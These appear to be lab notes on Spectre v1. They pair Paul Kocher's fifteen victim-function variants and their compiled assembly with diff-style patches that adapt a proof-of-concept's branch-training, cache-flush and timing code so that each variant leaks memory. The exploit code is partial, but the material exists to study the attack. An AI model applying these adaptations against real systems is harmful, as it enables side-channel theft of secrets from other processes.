SELECTED VICTIM FUNCTION: v4, v9, v12, v14, v15


v4 --> SPectre-v1-PoC-VF2
v9 --> SPectre-v1-PoC-VF3
v12 --> SPectre-v1-PoC-VF4
v14 --> SPectre-v1-PoC-VF5
v15 --> SPectre-v1-PoC-VF6









*********************************************************************
v4--> VF2: Add a left shift by one on the index.
void victim_function_v04(size_t x) {
     if (x < array1_size)
          temp &= array2[array1[x << 1] * 512];
}

Sol:

void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     ....
      /* M3. Controlled Branch Misprediction (Interleaved, Branchless) */
      int cond = (j % 6 == 0);  // 1 or 0
[-]   x = safe_x + cond * (malicious_x - safe_x);
[+]   x = safe_x + cond * ((malicious_x >> 1)- safe_x);
      victim_function(x);
    }

    ...
    for (i = 0; i < 256; i++) {
      ....
      /* M9. Hit/Miss Classification Threshold */
[-]   if (time_difference <= CACHE_HIT_THRESHOLD && mix_i != array1[safe_x])
[+]   if (time_difference <= CACHE_HIT_THRESHOLD && mix_i != array1[safe_x << 1])
        results[mix_i]++; 
    }

int main() {
  .....

     printf("Reading %d bytes:\n", Length);
     /* M12. Multi-Byte Extraction Loop */
     while (--Length >= 0) {
[+]       size_t target_abs = malicious_x;
          printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
          readMemoryByte(malicious_x++, value, score);
[+]       int is_even = ((target_abs & 1ULL) == 0);
[+]       if (is_even){
               printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
               printf("0x%02X=’%c’ score=%d ", value[0],
               (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
               printf("\n");
[+]       } else {
[+]            printf("Unclear: 0x3F='?' score=0\n");
          }
     }
     return (0);
}


*********************************************************************
v9--> VF3: Use a separate value to communicate the safety check status.
void victim_function_v09(size_t x, int *x_is_safe) {
     if (*x_is_safe)
          temp &= array2[array1[x] * 512];
}

Sol:

    for (j = 29; j >= 0; j--) {
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 100; z++) {} 
      int cond = (j % 6 == 0);  // 1 or 0
      x = safe_x + cond * (malicious_x - safe_x);
[-]   victim_function(x);
[+]   int x_is_safe = (x < array1_size); // <-- Set safety flag
[+]   victim_function(x, &x_is_safe);    // <-- Pass safety flag
    }


*******************************************************************
v12--> VF4: Make the index be the sum of two input parameters.
void victim_function_v12(size_t x, size_t y) {
     if ((x + y) < array1_size)
          temp &= array2[array1[x + y] * 512];
}


Sol:

    for (j = 29; j >= 0; j--) {
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 100; z++) {} 
      int cond = (j % 6 == 0);  // 1 or 0
[-]   x = safe_x + cond * (malicious_x - safe_x);
[+]   size_t x = safe_x * (1 - cond);
[+]   size_t y = cond * malicious_x;
[-]   victim_function(x);
[+]   victim_function(x, y);    
    }

or,

    for (j = 29; j >= 0; j--) {
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 100; z++) {} 
      int cond = (j % 6 == 0);  // 1 or 0
      x = safe_x + cond * (malicious_x - safe_x);
[+]   int y = 0;
[-]   victim_function(x);
[+]   victim_function(x, y);    
    }

*******************************************************************
v14--> VF5: Invert the low bits of x

void victim_function_v14(size_t x) {
     if (x < array1_size)
          temp &= array2[array1[x ^ 255] * 512];
}

Sol:
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     ....
      /* M3. Controlled Branch Misprediction (Interleaved, Branchless) */
      int cond = (j % 6 == 0);  // 1 or 0
[-]   x = (safe_x + cond * (malicious_x - safe_x));
[+]   x = (safe_x + cond * ((malicious_x ^ 255) - safe_x));
      victim_function(x);
    }

    ...
    for (i = 0; i < 256; i++) {
      ....
      /* M9. Hit/Miss Classification Threshold */
[-]   if (time_difference <= CACHE_HIT_THRESHOLD && mix_i != array1[safe_x])
[+]   if (time_difference <= CACHE_HIT_THRESHOLD && mix_i != array1[safe_x ^ 255])
        results[mix_i]++; 
    }

************************************************************************************
v15--> VF6:  Pass a pointer to the length

void victim_function_v15(size_t *x) {
     if (*x < array1_size)
          temp &= array2[array1[*x] * 512];
}

Sol: 

void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     ....
      /* M3. Controlled Branch Misprediction (Interleaved, Branchless) */
      int cond = (j % 6 == 0);  // 1 or 0
      x = (safe_x + cond * (malicious_x - safe_x));
[-]   victim_function(x);
[+]   victim_function(&x);
    }

**************************************************************************************


// Source: https://www.paulkocher.com/doc/MicrosoftCompilerSpectreMitigation.html
// ----------------------------------------------------------------------------------------
// EXAMPLE 1:  This is the sample function from the Spectre paper.
//
// Comments:  The generated assembly (below) includes an LFENCE on the vulnerable code 
// path, as expected

void victim_function_v01(size_t x) {
     if (x < array1_size) {
          temp &= array2[array1[x] * 512];
     }
}

//    mov     eax, DWORD PTR array1_size
//    cmp     rcx, rax
//    jae     SHORT $LN2@victim_fun
//    lfence
//    lea     rdx, OFFSET FLAT:__ImageBase
//    movzx   eax, BYTE PTR array1[rdx+rcx]
//    shl     rax, 9
//    movzx   eax, BYTE PTR array2[rax+rdx]
//    and     BYTE PTR temp, al
//  $LN2@victim_fun:
//    ret     0


// ----------------------------------------------------------------------------------------
// EXAMPLE 2:  Moving the leak to a local function that can be inlined.
// 
// Comments:  Produces identical assembly to the example above (i.e. LFENCE is included)
// ----------------------------------------------------------------------------------------

void leakByteLocalFunction_v02(uint8_t k) { temp &= array2[(k)* 512]; }
void victim_function_v02(size_t x) {
     if (x < array1_size) {
          leakByteLocalFunction(array1[x]);
     }
}


// ---------------------------------------------------------------------------------------------------------
                                              Solution
// ---------------------------------------------------------------------------------------------------------

[+] #define FORCE_INLINE __attribute__((always_inline)) inline
[+] static FORCE_INLINE void leakByteLocalFunction(uint8_t k) { temp &= array2[(k)* 512]; }
[-] void leakByteLocalFunction_v02(uint8_t k) { temp &= array2[(k)* 512]; }
void victim_function_v02(size_t x) {
    if (x < array1_size) {
          leakByteLocalFunction(array1[x]);
    }
}




// ----------------------------------------------------------------------------------------
// EXAMPLE 3:  Moving the leak to a function that cannot be inlined.
//
// Comments: Output is unsafe.  The same results occur if leakByteNoinlineFunction() 
// is in another source module.

__declspec(noinline) void leakByteNoinlineFunction(uint8_t k) { temp &= array2[(k)* 512]; }
void victim_function_v03(size_t x) {
     if (x < array1_size)
          leakByteNoinlineFunction(array1[x]);
}

//    mov     eax, DWORD PTR array1_size
//    cmp     rcx, rax
//    jae     SHORT $LN2@victim_fun
//    lea     rax, OFFSET FLAT:array1
//    movzx   ecx, BYTE PTR [rax+rcx]
//    jmp     leakByteNoinlineFunction
//  $LN2@victim_fun:
//    ret     0
//
//  leakByteNoinlineFunction PROC
//    movzx   ecx, cl
//    lea     rax, OFFSET FLAT:array2
//    shl     ecx, 9
//    movzx   eax, BYTE PTR [rcx+rax]
//    and     BYTE PTR temp, al
//    ret     0
//  leakByteNoinlineFunction ENDP




// ---------------------------------------------------------------------------------------------------------
                                              Solution
// ---------------------------------------------------------------------------------------------------------


[+]  #define NOINLINE __attribute__((noinline))
[-]  __declspec(noinline) void leakByteNoinlineFunction(uint8_t k) { temp &= array2  [(k)* 512]; }
[+]  NOINLINE void leakByteNoinlineFunction(uint8_t k) { temp &= array2[(k) * 512]; }
     void victim_function(size_t x) {
          if (x < array1_size)
               leakByteNoinlineFunction(array1[x]);
     }






// ----------------------------------------------------------------------------------------
// EXAMPLE 4:  Add a left shift by one on the index.
// 
// Comments: Output is unsafe.

void victim_function_v04(size_t x) {
     if (x < array1_size)
          temp &= array2[array1[x << 1] * 512];
}

//    mov     eax, DWORD PTR array1_size
//    cmp     rcx, rax
//    jae     SHORT $LN2@victim_fun
//    lea     rdx, OFFSET FLAT:__ImageBase
//    movzx   eax, BYTE PTR array1[rdx+rcx*2]
//    shl     rax, 9
//    movzx   eax, BYTE PTR array2[rax+rdx]
//    and     BYTE PTR temp, al
//  $LN2@victim_fun:
//    ret     0



// ---------------------------------------------------------------------------------------------------------
                                              Solution
// ---------------------------------------------------------------------------------------------------------



void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     ....
      /* M3. Controlled Branch Misprediction (Interleaved, Branchless) */
      int cond = (j % 6 == 0);  // 1 or 0
[-]   x = safe_x + cond * (malicious_x - safe_x);
[+]   x = safe_x + cond * ((malicious_x >> 1)- safe_x);
      victim_function(x);
    }

    ...
    for (i = 0; i < 256; i++) {
      ....
      /* M9. Hit/Miss Classification Threshold */
[-]   if (time_difference <= CACHE_HIT_THRESHOLD && mix_i != array1[safe_x])
[+]   if (time_difference <= CACHE_HIT_THRESHOLD && mix_i != array1[safe_x << 1])
        results[mix_i]++; 
    }

int main() {
  .....

     printf("Reading %d bytes:\n", Length);
     /* M12. Multi-Byte Extraction Loop */
     while (--Length >= 0) {
[+]       size_t target_abs = malicious_x;
          printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
          readMemoryByte(malicious_x++, value, score);
[+]       int is_even = ((target_abs & 1ULL) == 0);
[+]       if (is_even){
               printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
               printf("0x%02X=’%c’ score=%d ", value[0],
               (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
               printf("\n");
[+]       } else {
[+]            printf("Unclear: 0x3F='?' score=0\n");
          }
     }
     return (0);
}






// ----------------------------------------------------------------------------------------
// EXAMPLE 5:  Use x as the initial value in a for() loop.
//
// Comments: Output is unsafe.

void victim_function_v05(size_t x) {
     size_t i;
     if (x < array1_size) {
          for (i = x - 1; i >= 0; i--)
               temp &= array2[array1[i] * 512];
     }
}

//    mov     eax, DWORD PTR array1_size
//    cmp     rcx, rax
//    jae     SHORT $LN3@victim_fun
//    movzx   edx, BYTE PTR temp
//    lea     r8, OFFSET FLAT:__ImageBase
//    lea     rax, QWORD PTR array1[r8-1]
//    add     rax, rcx
//  $LL4@victim_fun:
//    movzx   ecx, BYTE PTR [rax]
//    lea     rax, QWORD PTR [rax-1]
//    shl     rcx, 9
//    and     dl, BYTE PTR array2[rcx+r8]
//    jmp     SHORT $LL4@victim_fun
//  $LN3@victim_fun:
//    ret     0



// ---------------------------------------------------------------------------------------------------------
                                              Solution
// ---------------------------------------------------------------------------------------------------------

Does not Work with changes

[+] #include <sys/types.h>
[+] typedef size_t __real_size_t;
[+] #undef size_t
[+] #define size_t ssize_t
void victim_function_v05(size_t x) {
     size_t i;
     if (x < array1_size) {
          for (i = x - 1; i >= 0; i--)
               temp &= array2[array1[i] * 512];
     }
}
[+] #undef size_t
[+] #define size_t __real_size_t


The code will compile, however, cannot leak the secret as the victim function is accessing more than one entries.

Spectre-v1 needs a single bounds-checked, secret-dependent access, so that under misprediction the transient access uses array1[x]. 
Here, the loop touches many indices per call, which drowns the signal and breaks the usual train→invoke pattern.



// ----------------------------------------------------------------------------------------
// EXAMPLE 6:  Check the bounds with an AND mask, rather than "<".
//
// Comments: Output is unsafe.

void victim_function_v06(size_t x) {
     if ((x & array_size_mask) == x)
          temp &= array2[array1[x] * 512];
}

//    mov     eax, DWORD PTR array_size_mask
//    and     rax, rcx
//    cmp     rax, rcx
//    jne     SHORT $LN2@victim_fun
//    lea     rdx, OFFSET FLAT:__ImageBase
//    movzx   eax, BYTE PTR array1[rdx+rcx]
//    shl     rax, 9
//    movzx   eax, BYTE PTR array2[rax+rdx]
//    and     BYTE PTR temp, al
//  $LN2@victim_fun:
//    ret     0


// ---------------------------------------------------------------------------------------------------------
                                              Solution
// ---------------------------------------------------------------------------------------------------------

Works with changes

[+] #define array_size_mask (array1_size - 1)
void victim_function_v06(size_t x) {
     if ((x & array_size_mask) == x)
          temp &= array2[array1[x] * 512];
}




// ----------------------------------------------------------------------------------------
// EXAMPLE 7:  Compare against the last known-good value.
//
// Comments: Output is unsafe.

void victim_function_v07(size_t x) {
     static size_t last_x = 0;
     if (x == last_x)
          temp &= array2[array1[x] * 512];
     if (x < array1_size)
          last_x = x;
}

//    mov     rdx, QWORD PTR ?last_x@?1??victim_function_v07@@9@9
//    cmp     rcx, rdx
//    jne     SHORT $LN2@victim_fun
//    lea     r8, OFFSET FLAT:__ImageBase
//    movzx   eax, BYTE PTR array1[r8+rcx]
//    shl     rax, 9
//    movzx   eax, BYTE PTR array2[rax+r8]
//    and     BYTE PTR temp, al
//  $LN2@victim_fun:
//    mov     eax, DWORD PTR array1_size
//    cmp     rcx, rax
//    cmovb   rdx, rcx
//    mov     QWORD PTR ?last_x@?1??victim_function_v07@@9@9, rdx
//    ret     0

// ---------------------------------------------------------------------------------------------------------
                                              Solution
// ---------------------------------------------------------------------------------------------------------




// ----------------------------------------------------------------------------------------
// EXAMPLE 8:  Use a ?: operator to check bounds.

void victim_function_v08(size_t x) {
     temp &= array2[array1[x < array1_size ? (x + 1) : 0] * 512];
}

//    cmp     rcx, QWORD PTR array1_size
//    jae     SHORT $LN3@victim_fun
//    inc     rcx
//    jmp     SHORT $LN4@victim_fun
//  $LN3@victim_fun:
//    xor     ecx, ecx
//  $LN4@victim_fun:
//    lea     rdx, OFFSET FLAT:__ImageBase
//    movzx   eax, BYTE PTR array1[rcx+rdx]
//    shl     rax, 9
//    movzx   eax, BYTE PTR array2[rax+rdx]
//    and     BYTE PTR temp, al
//    ret     0

// ---------------------------------------------------------------------------------------------------------
                                              Solution
// ---------------------------------------------------------------------------------------------------------

No Changes Required

// ----------------------------------------------------------------------------------------
// EXAMPLE 9:  Use a separate value to communicate the safety check status.
//
// Comments: Output is unsafe.

void victim_function_v09(size_t x, int *x_is_safe) {
     if (*x_is_safe)
          temp &= array2[array1[x] * 512];
}

//    cmp     DWORD PTR [rdx], 0
//    je      SHORT $LN2@victim_fun
//    lea     rdx, OFFSET FLAT:__ImageBase
//    movzx   eax, BYTE PTR array1[rcx+rdx]
//    shl     rax, 9
//    movzx   eax, BYTE PTR array2[rax+rdx]
//    and     BYTE PTR temp, al
//  $LN2@victim_fun:
//    ret     0


// ---------------------------------------------------------------------------------------------------------
                                              Solution
// ---------------------------------------------------------------------------------------------------------


    for (j = 29; j >= 0; j--) {
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 100; z++) {} 
      int cond = (j % 6 == 0);  // 1 or 0
      x = safe_x + cond * (malicious_x - safe_x);
[-]   victim_function(x);
[+]   int x_is_safe = (x < array1_size); // <-- Set safety flag
[+]   victim_function(x, &x_is_safe);    // <-- Pass safety flag
    }

// ----------------------------------------------------------------------------------------
// EXAMPLE 10:  Leak a comparison result.
//
// Comments: Output is unsafe.  Note that this vulnerability is a little different, namely
// the attacker is assumed to provide both x and k.  The victim code checks whether 
// array1[x] == k.  If so, the victim reads from array2[0].  The attacker can try
// values for k until finding the one that causes array2[0] to get brought into the cache.

void victim_function_v10(size_t x, uint8_t k) {
     if (x < array1_size) {
          if (array1[x] == k)
               temp &= array2[0];
     }
}

//    mov     eax, DWORD PTR array1_size
//    cmp     rcx, rax
//    jae     SHORT $LN3@victim_fun
//    lea     rax, OFFSET FLAT:array1
//    cmp     BYTE PTR [rcx+rax], dl
//    jne     SHORT $LN3@victim_fun
//    movzx   eax, BYTE PTR array2
//    and     BYTE PTR temp, al
//  $LN3@victim_fun:
//    ret     0


// ----------------------------------------------------------------------------------------
// EXAMPLE 11:  Use memcmp() to read the memory for the leak.
//
// Comments: Output is unsafe.

void victim_function_v11(size_t x) {
     if (x < array1_size)
          temp = memcmp(&temp, array2 + (array1[x] * 512), 1);
}

//    mov     eax, DWORD PTR array1_size
//    cmp     rcx, rax
//    jae     SHORT $LN2@victim_fun
//    lea     rax, OFFSET FLAT:array1
//    movzx   ecx, BYTE PTR [rax+rcx]
//    lea     rax, OFFSET FLAT:array2
//    shl     rcx, 9
//    add     rcx, rax
//    movzx   eax, BYTE PTR temp
//    cmp     al, BYTE PTR [rcx]
//    jne     SHORT $LN4@victim_fun
//    xor     eax, eax
//    mov     BYTE PTR temp, al
//    ret     0
//  $LN4@victim_fun:
//    sbb     eax, eax
//    or      eax, 1
//    mov     BYTE PTR temp, al
//  $LN2@victim_fun:
//    ret     0

// ---------------------------------------------------------------------------------------------------------
                                              Solution
// ---------------------------------------------------------------------------------------------------------

No Changes Required



// ----------------------------------------------------------------------------------------
// EXAMPLE 12:  Make the index be the sum of two input parameters.
//
// Comments: Output is unsafe.

void victim_function_v12(size_t x, size_t y) {
     if ((x + y) < array1_size)
          temp &= array2[array1[x + y] * 512];
}

//    mov     eax, DWORD PTR array1_size
//    lea     r8, QWORD PTR [rcx+rdx]
//    cmp     r8, rax
//    jae     SHORT $LN2@victim_fun
//    lea     rax, QWORD PTR array1[rcx]
//    lea     r8, OFFSET FLAT:__ImageBase
//    add     rax, r8
//    movzx   ecx, BYTE PTR [rax+rdx]
//    shl     rcx, 9
//    movzx   eax, BYTE PTR array2[rcx+r8]
//    and     BYTE PTR temp, al
//  $LN2@victim_fun:
//    ret     0


// ---------------------------------------------------------------------------------------------------------
                                              Solution
// ---------------------------------------------------------------------------------------------------------

Solution 1:

    for (j = 29; j >= 0; j--) {
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 100; z++) {} 
      int cond = (j % 6 == 0);  // 1 or 0
      x = safe_x + cond * (malicious_x - safe_x);
[+]   int y = 0;
[-]   victim_function(x);
[+]   victim_function(x, y);    
    }

Solution 2:

    for (j = 29; j >= 0; j--) {
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 100; z++) {} 
      int cond = (j % 6 == 0);  // 1 or 0
[-]   x = safe_x + cond * (malicious_x - safe_x);
[+]   size_t x = safe_x * (1 - cond);
[+]   size_t y = cond * malicious_x;
[-]   victim_function(x);
[+]   victim_function(x, y);    
    }

// ----------------------------------------------------------------------------------------
// EXAMPLE 13:  Do the safety check into an inline function
//
// Comments: Output is unsafe.

__inline int is_x_safe(size_t x) { if (x < array1_size) return 1; return 0; }
void victim_function_v13(size_t x) {
     if (is_x_safe(x))
          temp &= array2[array1[x] * 512];
}

//    mov     eax, DWORD PTR array1_size
//    cmp     rcx, rax
//    jae     SHORT $LN2@victim_fun
//    lea     rdx, OFFSET FLAT:__ImageBase
//    movzx   eax, BYTE PTR array1[rdx+rcx]
//    shl     rax, 9
//    movzx   eax, BYTE PTR array2[rax+rdx]
//    and     BYTE PTR temp, al
//  $LN2@victim_fun:
//    ret     0


// ---------------------------------------------------------------------------------------------------------
                                              Solution
// ---------------------------------------------------------------------------------------------------------

No Singnificant change is required in the code.

[-] __inline int is_x_safe(size_t x) { if (x < array1_size) return 1; return 0; }
[+] static inline int is_x_safe(size_t x) { if (x < array1_size) return 1; return 0; }
void victim_function(size_t x) {
     if (is_x_safe(x))
          temp &= array2[array1[x] * 512];
}


// ----------------------------------------------------------------------------------------
// EXAMPLE 14:  Invert the low bits of x
//
// Comments: Output is unsafe.

void victim_function_v14(size_t x) {
     if (x < array1_size)
          temp &= array2[array1[x ^ 255] * 512];
}

//    mov     eax, DWORD PTR array1_size
//    cmp     rcx, rax
//    jae     SHORT $LN2@victim_fun
//    xor     rcx, 255                    ; 000000ffH
//    lea     rdx, OFFSET FLAT:__ImageBase
//    movzx   eax, BYTE PTR array1[rcx+rdx]
//    shl     rax, 9
//    movzx   eax, BYTE PTR array2[rax+rdx]
//    and     BYTE PTR temp, al
//  $LN2@victim_fun:
//    ret     0



// ---------------------------------------------------------------------------------------------------------
                                              Solution
// ---------------------------------------------------------------------------------------------------------

/* Optional */
[-] uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
[+] uint8_t array1[256] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
/************/

void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     ....
      /* M3. Controlled Branch Misprediction (Interleaved, Branchless) */
      int cond = (j % 6 == 0);  // 1 or 0
[-]   x = (safe_x + cond * (malicious_x - safe_x));
[+]   x = (safe_x + cond * ((malicious_x ^ 255) - safe_x));
      victim_function(x);
    }

    ...
    for (i = 0; i < 256; i++) {
      ....
      /* M9. Hit/Miss Classification Threshold */
[-]   if (time_difference <= CACHE_HIT_THRESHOLD && mix_i != array1[safe_x])
[+]   if (time_difference <= CACHE_HIT_THRESHOLD && mix_i != array1[safe_x ^ 255])
        results[mix_i]++; 
    }

// ----------------------------------------------------------------------------------------
// EXAMPLE 15:  Pass a pointer to the length
//
// Comments: Output is unsafe.

void victim_function_v15(size_t *x) {
     if (*x < array1_size)
          temp &= array2[array1[*x] * 512];
}

//    mov     rax, QWORD PTR [rcx]
//    cmp     rax, QWORD PTR array1_size
//    jae     SHORT $LN2@victim_fun
//    lea     rcx, OFFSET FLAT:__ImageBase
//    movzx   eax, BYTE PTR array1[rax+rcx]
//    shl     rax, 9
//    movzx   eax, BYTE PTR array2[rax+rcx]
//    and     BYTE PTR temp, al
//  $LN2@victim_fun:
//    ret     0

// ---------------------------------------------------------------------------------------------------------
                                              Solution
// ---------------------------------------------------------------------------------------------------------


void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     ....
      /* M3. Controlled Branch Misprediction (Interleaved, Branchless) */
      int cond = (j % 6 == 0);  // 1 or 0
      x = (safe_x + cond * (malicious_x - safe_x));
[-]   victim_function(x);
[+]   victim_function(&x);
    }